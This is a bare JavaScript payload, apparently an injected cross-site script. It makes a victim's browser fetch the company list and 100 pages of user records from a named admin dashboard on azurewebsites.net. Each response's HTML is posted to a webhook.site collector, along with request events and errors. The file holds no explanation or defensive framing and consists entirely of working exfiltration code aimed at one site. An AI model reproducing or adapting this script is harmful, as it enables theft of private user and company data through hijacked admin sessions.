
  
  var xhr1 = new XMLHttpRequest();

function addListeners(xhr) {
    xhr.addEventListener('loadstart', handleEvent);
    xhr.addEventListener('load', handleEvent);
    xhr.addEventListener('loadend', handleEvent);
    xhr.addEventListener('progress', handleEvent);
    xhr.addEventListener('error', handleEvent);
    xhr.addEventListener('abort', handleEvent);
}

function handleEvent(event) {
            var http = new XMLHttpRequest();
          var url = "https://webhook.site/3d15bff1-d379-4b33-a0af-b95f18e0e0f9/event";
          http.open("POST", url, true);
  http.send(event.type);

}
  addListeners(xhr1);
  xhr1.onreadystatechange = function() {
  if (xhr1.readyState == 4) {
    
          var http = new XMLHttpRequest();
          var url = "https://webhook.site/3d15bff1-d379-4b33-a0af-b95f18e0e0f9/companies";
          http.open("POST", url, true);
          http.setRequestHeader("Content-type", "text/plain");
  
          page_data = {
                    "page_html": xhr1.responseText,
                    "uri": 'company'
                };
        http.send(JSON.stringify(page_data));
  }
  };
  xhr1.open('GET', "https://haatadmindashboard.azurewebsites.net/admin/getcompanies?AreaId=0&_=1647447034214", true);
xhr1.send(null);



for (let i = 0; i < 100; i++) {
  
   await new Promise(r => setTimeout(r, 1500));
  //https://haatadmindashboard.azurewebsites.net/admin/getcompanies?AreaId=0&_=1647447034214
  
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function() {
  if (xhr.readyState == 4) {

          var http = new XMLHttpRequest();
         // var url = "https://webhook.site/3d15bff1-d379-4b33-a0af-b95f18e0e0f9/"+i;
          var url = "https://webhook.site/3d15bff1-d379-4b33-a0af-b95f18e0e0f9/"+i;
          http.open("POST", url, true);
          http.setRequestHeader("Content-type", "text/plain");
  
          page_data = {
                    "page_html": xhr.responseText,
                    "uri": 'users'+i
                };
        http.send(JSON.stringify(page_data));

            } //if ==4
    else {
                var http = new XMLHttpRequest();
          var url = "https://webhook.site/3d15bff1-d379-4b33-a0af-b95f18e0e0f9/error";
          http.open("POST", url, true);
          http.setRequestHeader("Content-type", "text/plain");
          http.send(xhr.readyState);
    }
        
}; //ready xhr
xhr.open('GET', "https://haatadmindashboard.azurewebsites.net/admin/getusers?sort=true&draw=1&AreaId=0&start="+i*100+"&length=100", true);
xhr.send(null);  
  
} //for


